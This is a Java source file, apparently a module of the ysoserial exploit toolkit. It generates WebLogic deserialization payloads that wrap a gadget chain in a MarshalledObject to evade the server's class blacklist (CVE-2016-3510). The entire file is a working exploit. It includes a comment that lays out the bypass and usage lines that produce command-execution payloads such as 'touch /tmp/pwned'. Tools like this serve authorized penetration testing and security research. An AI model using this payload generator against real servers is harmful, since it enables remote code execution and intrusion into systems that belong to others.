package ysoserial.payloads;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	WebLogic MarshalledObject wrapper — CVE-2016-3510 blacklist bypass.

	weblogic.corba.utils.MarshalledObject stores a serialized object
	as raw bytes in its "objBytes" field. Its readResolve() deserializes
	these bytes using a vanilla ObjectInputStream — without WebLogic's
	class filter (ClassFilter / InboundMsgAbbrev blacklist).

	Gadget chain:
		ObjectInputStream.readObject()  [T3 transport — filter applied]
			MarshalledObject.readResolve()
				new ObjectInputStream(objBytes).readObject()  [NO filter]
					<wrapped payload>.readObject()
						→ Original chain executes unfiltered

	Usage:
		Payload arg is "InnerPayloadClass:command":
		  java -jar ysoserial.jar WebLogic1 'CommonsCollections6:touch /tmp/pwned'
		  java -jar ysoserial.jar WebLogic1 'CommonsCollections1:id'

	Bypasses:
		- WebLogic 10.3.6.0 CPU patch (blacklist v1, post-CVE-2015-4852)
		- Blocks: InvokerTransformer, ChainedTransformer, BadAttributeValueExpException, etc.
		- MarshalledObject is CORBA infrastructure — never blacklisted

	Implementation:
		100% reflection — no WebLogic imports. Compiles without weblogic.jar.
		User must add weblogic.jar to classpath at runtime for payload generation.

	Requires at runtime:
		weblogic.jar (on generator's classpath, NOT bundled)
		+ whatever the inner payload requires
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({})  // weblogic.jar required at runtime, not bundled
@Authors({ Authors.DMBS335 })
public class WebLogic1 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		// Parse "PayloadClass:command" format
		int colonIdx = command.indexOf(':');
		if (colonIdx <= 0) {
			throw new IllegalArgumentException(
				"Format: 'InnerPayloadClass:command'\n" +
				"  e.g. 'CommonsCollections6:touch /tmp/pwned'\n" +
				"  e.g. 'CommonsCollections1:id'");
		}

		String payloadClassName = command.substring(0, colonIdx);
		String innerCommand = command.substring(colonIdx + 1);

		// 1. Generate inner payload using ysoserial
		Class<? extends ObjectPayload> payloadClass =
			(Class<? extends ObjectPayload>) Class.forName(
				"ysoserial.payloads." + payloadClassName);
		ObjectPayload innerPayloadGen = payloadClass.newInstance();
		Object innerObject = innerPayloadGen.getObject(innerCommand);

		// 2. Serialize inner payload to raw bytes
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(innerObject);
		oos.close();
		byte[] innerBytes = baos.toByteArray();

		// 3. Wrap in MarshalledObject via reflection
		//    MarshalledObject(Object) constructor serializes the object internally,
		//    but we set objBytes directly to avoid double-serialization issues.
		return wrapInMarshalledObject(innerBytes);
	}

	/**
	 * Create a MarshalledObject with pre-serialized bytes.
	 *
	 * MarshalledObject.readResolve() does:
	 *   new ObjectInputStream(new ByteArrayInputStream(objBytes)).readObject()
	 * This inner ObjectInputStream has NO class filter → bypass.
	 */
	private static Serializable wrapInMarshalledObject(byte[] innerBytes) throws Exception {
		Class<?> moClass;
		try {
			moClass = Class.forName("weblogic.corba.utils.MarshalledObject");
		} catch (ClassNotFoundException e) {
			throw new RuntimeException(
				"weblogic.jar not on classpath. Run with:\n" +
				"  java -cp ysoserial.jar:weblogic.jar ysoserial.GeneratePayload WebLogic1 ...");
		}

		// Use the constructor that takes an Object — it serializes internally.
		// But that would re-serialize our already-serialized bytes.
		// Instead, create empty instance and set objBytes directly.

		// Try no-arg constructor first, then fallback to Unsafe
		Object mo;
		try {
			Constructor<?> ctor = moClass.getDeclaredConstructor();
			Reflections.setAccessible(ctor);
			mo = ctor.newInstance();
		} catch (NoSuchMethodException e) {
			// No no-arg constructor — use Unsafe to allocate without constructor
			mo = Reflections.createWithoutConstructor(moClass);
		}

		// Set objBytes field to our pre-serialized inner payload
		Field objBytesField = moClass.getDeclaredField("objBytes");
		Reflections.setAccessible(objBytesField);
		objBytesField.set(mo, innerBytes);

		// Set hash to avoid NPE during serialization
		Field hashField = moClass.getDeclaredField("hash");
		Reflections.setAccessible(hashField);
		hashField.setInt(mo, innerBytes.hashCode());

		return (Serializable) mo;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(WebLogic1.class, args);
	}
}
